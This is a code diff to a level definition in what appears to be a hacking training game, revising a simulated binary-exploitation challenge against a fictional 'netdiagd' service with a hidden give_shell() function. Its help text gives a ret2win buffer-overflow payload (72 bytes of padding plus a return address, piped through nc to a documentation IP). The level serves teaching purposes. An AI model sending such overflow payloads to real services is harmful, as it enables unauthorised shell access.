@@ -1,5 +1,5 @@
 import type { ChainDef } from "../../types";
-import { match, strictCmd } from "../../engine";
+import { match, strictCmd, matchesExactAddress, matchesExactOffset } from "../../engine";
 
 const IP = "192.0.2.230";
 
@@ -119,10 +119,12 @@ export const ghostLevel3: ChainDef = {
             completesObjective: "analyze",
             tone: "success",
             setsFlags: ["saw_protections"],
+            note: "Solstice netdiagd — fixed image base: 0x0000000000400000 (non-PIE)",
             output: [
               "CANARY    : disabled",
               "NX        : enabled",
               "PIE       : disabled",
+              "BASE      : 0x0000000000400000",
               "RELRO     : partial",
               "",
               "note: no canary and a fixed load address, on a binary that reads unbounded input — worth",
@@ -140,13 +142,13 @@ export const ghostLevel3: ChainDef = {
             completesObjective: "locate-win",
             tone: "success",
             setsFlags: ["have_win_addr"],
-            note: "Solstice netdiagd — hidden backdoor function give_shell() @ 0x0000000000401196",
+            note: "Solstice netdiagd — hidden backdoor function give_shell(), symbol offset 0x1196 from image base",
             output: [
-              "0000000000401196 <give_shell>:",
-              "  401196:  55                    push   %rbp",
-              "  401197:  48 89 e5              mov    %rsp,%rbp",
-              "  40119a:  48 8d 3d ...          lea    ... ; \"/bin/sh\"",
-              "  4011a5:  e8 ...                call   system@plt",
+              "give_shell:  0000000000001196   (offset from image base — see checksec's BASE line)",
+              "  1196:  55                    push   %rbp",
+              "  1197:  48 89 e5              mov    %rsp,%rbp",
+              "  119a:  48 8d 3d ...          lea    ... ; \"/bin/sh\"",
+              "  11a5:  e8 ...                call   system@plt",
               "",
               "note: give_shell() exists in the binary but is never called anywhere in main() — dead code,",
               "unless something redirects execution straight to it.",
@@ -203,11 +205,11 @@ export const ghostLevel3: ChainDef = {
           match: (input) => {
             const n = input.toLowerCase();
             return (
-              n.includes("72") &&
-              n.includes("401196") &&
+              matchesExactOffset(n, 72) &&
+              matchesExactAddress(n, "401196") &&
               n.includes("nc ") &&
               n.includes(IP) &&
-              n.includes("7878")
+              matchesExactOffset(n, 7878)
             );
           },
           help: 'python3 -c "print(\'A\'*72 + p64(0x401196))" | nc <ip> 7878',
